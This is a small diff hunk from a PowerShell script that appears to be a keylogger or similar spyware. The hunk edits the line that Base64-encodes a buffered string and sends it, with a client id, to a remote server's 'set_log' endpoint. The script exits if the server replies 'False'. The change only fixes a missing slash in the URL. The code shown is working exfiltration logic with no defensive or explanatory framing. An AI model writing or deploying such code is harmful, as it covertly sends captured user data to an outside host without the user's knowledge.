@@ -173,7 +173,7 @@ while ($true) {
 		$timer = 0
 		$buff = $buff.Trim()
 		if($buff.Length -gt 10) {
-			if((New-Object Net.WebClient).DownloadString($server+'set_log/?id='+$id+'&string='+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buff))) -eq 'False') {
+			if((New-Object Net.WebClient).DownloadString($server+'/set_log/?id='+$id+'&string='+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buff))) -eq 'False') {
 				Exit
 			}
 
